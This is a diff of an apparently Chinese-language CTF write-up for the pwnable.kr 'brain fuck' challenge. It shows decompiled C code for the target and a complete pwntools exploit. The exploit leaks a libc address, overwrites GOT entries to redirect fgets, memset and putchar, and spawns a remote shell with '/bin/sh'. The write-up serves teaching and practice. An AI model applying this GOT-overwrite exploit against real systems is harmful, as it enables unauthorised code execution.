@@ -8,8 +8,8 @@ tags: [pwn, security]
 
 ### [brain fuck]
 
-> I made a simple brain-fuck language emulation program written in C. <br>
-> The [ ] commands are not implemented yet. However the rest functionality seems working fine. <br>
+> I made a simple brain-fuck language emulation program written in C.<br>
+> The [ ] commands are not implemented yet. However the rest functionality seems working fine.<br>
 > Find a bug and exploit it to get a shell. 
 >
 > Download : http://pwnable.kr/bin/bf<br>
@@ -17,75 +17,79 @@ tags: [pwn, security]
 >
 > Running at : nc pwnable.kr 9001
 
-`bf` 为 32 ELF 程序：
+`bf` 为 32 位 ELF 程序：
 
 ![img]({{ site.url }}/public/img/article/2015-07-25-rookiss-writeup-pwnable-kr/brain-fuck-1.png)
 
 使用 IDA 分析，程序会让你输入一串字符（最多1024bytes）然后遍历字符进行解析：
 
-	int __cdecl main(int argc, const char **argv, const char **envp)
-	{
-	  int result; // eax@4
-	  int v4; // edx@4
-	  size_t i; // [sp+28h] [bp-40Ch]@1
-	  int v6; // [sp+2Ch] [bp-408h]@1
-	  int v7; // [sp+42Ch] [bp-8h]@1
+```c
+int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  int result; // eax@4
+  int v4; // edx@4
+  size_t i; // [sp+28h] [bp-40Ch]@1
+  int v6; // [sp+2Ch] [bp-408h]@1
+  int v7; // [sp+42Ch] [bp-8h]@1
 	
-	  v7 = *MK_FP(__GS__, 20);
-	  setvbuf(stdout, 0, 2, 0);
-	  setvbuf(stdin, 0, 1, 0);
-	  p = (int)&tape;
-	  puts("welcome to brainfuck testing system!!");
-	  puts("type some brainfuck instructions except [ ]");
-	  memset(&v6, 0, 0x400u);
-	  fgets((char *)&v6, 1024, stdin);
-	  for ( i = 0; i < strlen((const char *)&v6); ++i )
-	    do_brainfuck(*((_BYTE *)&v6 + i));
-	  result = 0;
-	  v4 = *MK_FP(__GS__, 20) ^ v7;
-	  return result;
-	}
+  v7 = *MK_FP(__GS__, 20);
+  setvbuf(stdout, 0, 2, 0);
+  setvbuf(stdin, 0, 1, 0);
+  p = (int)&tape;
+  puts("welcome to brainfuck testing system!!");
+  puts("type some brainfuck instructions except [ ]");
+  memset(&v6, 0, 0x400u);
+  fgets((char *)&v6, 1024, stdin);
+  for ( i = 0; i < strlen((const char *)&v6); ++i )
+    do_brainfuck(*((_BYTE *)&v6 + i));
+  result = 0;
+  v4 = *MK_FP(__GS__, 20) ^ v7;
+  return result;
+}
+```
 	
 `do_brainfuck` 函数有一些列对指针 `p` 进行操作的分支：
 
-	int __cdecl do_brainfuck(char a1)
-	{
-	  int result; // eax@1
-	  int v2; // ebx@7
+```c
+int __cdecl do_brainfuck(char a1)
+{
+  int result; // eax@1
+  int v2; // ebx@7
 	
-	  result = a1;
-	  switch ( a1 )
-	  {
-	    case '>':
-	      result = p++ + 1;
-	      break;
-	    case '<':
-	      result = p-- - 1;
-	      break;
-	    case '+':
-	      result = p;
-	      ++*(_BYTE *)p;
-	      break;
-	    case '-':
-	      result = p;
-	      --*(_BYTE *)p;
-	      break;
-	    case '.':
-	      result = putchar(*(_BYTE *)p);
-	      break;
-	    case ',':
-	      v2 = p;
-	      result = getchar();
-	      *(_BYTE *)v2 = result;
-	      break;
-	    case '[':
-	      result = puts("[ and ] not supported.");
-	      break;
-	    default:
-	      return result;
-	  }
-	  return result;
-	}
+  result = a1;
+  switch ( a1 )
+  {
+    case '>':
+      result = p++ + 1;
+      break;
+    case '<':
+      result = p-- - 1;
+      break;
+    case '+':
+      result = p;
+      ++*(_BYTE *)p;
+      break;
+    case '-':
+      result = p;
+      --*(_BYTE *)p;
+      break;
+    case '.':
+      result = putchar(*(_BYTE *)p);
+      break;
+    case ',':
+      v2 = p;
+      result = getchar();
+      *(_BYTE *)v2 = result;
+      break;
+    case '[':
+      result = puts("[ and ] not supported.");
+      break;
+    default:
+      return result;
+  }
+  return result;
+}
+```
 	
 这里的指针 `p` 是一个字符型指针，每次自增或自减会使得指向的地址 `+0x1` 或 `-0x1`。根据分析可以得到如下解析说明：
 
@@ -115,40 +119,51 @@ tags: [pwn, security]
 	
 最终的 exp 如下：
 
-	from pwn import *
-	
-	libc = ELF('./bf_libc.so')
-	
-	p = remote('pwnable.kr', 9001)
-	#p = process('./bf')
-	p.recvline_startswith('type')
-	
-	# Move the pointer to .got.plt fgets()
-	payload = '<' * (0x0804A0A0 - 0x0804A010)
-	# Print .got.plt fgets() address in memory each bytes
-	payload += '.>' * 4
-	# reMove the pointer to .got.plt fgets()
-	payload += '<' * 4
-	# Write .got.plt fgets() to system()
-	payload += ',>' * 4
-	# Move the pointer to .got.plt memset()
-	payload += '>' * (0x0804A02C - 0x0804A014)
-	# Write .got.plt memset() to fgets()
-	payload += ',>' * 4
-	# Writr .got.plt putchar() to main() 0x08048671
-	payload += ',>' * 4
-	# Call putchar(), actually main() called
-	payload += '.'
-	
-	p.sendline(payload)
-	
-	fgets_addr = p.recvn(4)[::-1].encode('hex')
-	system_addr = int(fgets_addr, 16) - libc.symbols['fgets'] + libc.symbols['system']
-	gets_addr = int(fgets_addr, 16) - libc.symbols['fgets'] + libc.symbols['gets']
-	
-	p.send(p32(system_addr))
-	p.send(p32(gets_addr))
-	p.send(p32(0x08048671))
-	p.sendline('/bin/sh')
-	p.interactive()
-	
+```python
+#!/usr/bin/env python
+# coding: utf-8
+
+from pwn import *
+
+# Remote EXP
+libc = ELF('./bf_libc.so')
+p = remote('pwnable.kr', 9001)
+
+# Local EXP
+# libc = ELF('./libc.so.6')
+# p = process('./bf')
+
+
+p.recvline_startswith('type')
+
+# Move the pointer to .got.plt fgets()
+payload = '<' * (0x0804A0A0 - 0x0804A010)
+# Print .got.plt fgets() address in memory each bytes
+payload += '.>' * 4
+# reMove the pointer to .got.plt fgets()
+payload += '<' * 4
+# Write .got.plt fgets() to system()
+payload += ',>' * 4
+# Move the pointer to .got.plt memset()
+payload += '>' * (0x0804A02C - 0x0804A014)
+# Write .got.plt memset() to fgets()
+payload += ',>' * 4
+# Writr .got.plt putchar() to main() 0x08048671
+payload += ',>' * 4
+# Call putchar(), actually main() called
+payload += '.'
+
+p.sendline(payload)
+
+fgets_addr = p.recvn(4)[::-1].encode('hex')
+system_addr = int(fgets_addr, 16) - libc.symbols['fgets'] + libc.symbols['system']
+gets_addr = int(fgets_addr, 16) - libc.symbols['fgets'] + libc.symbols['gets']
+
+p.send(p32(system_addr))
+p.send(p32(gets_addr))
+p.send(p32(0x08048671))
+p.sendline('/bin/sh')
+p.interactive()
+```
+
+
